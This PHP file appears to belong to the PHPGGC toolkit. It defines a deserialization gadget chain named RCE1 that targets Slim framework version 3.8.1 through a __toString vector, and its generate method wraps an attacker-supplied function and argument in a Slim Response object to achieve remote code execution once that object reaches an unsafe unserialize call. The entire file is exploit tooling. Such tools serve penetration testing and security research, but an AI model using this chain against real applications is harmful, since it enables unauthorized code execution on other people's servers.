<?php

namespace GadgetChain\Slim;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.8.1';
    public static $vector = '__toString';
    public static $author = 'cf';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Slim\Http\Response($function, $parameter);
    }
}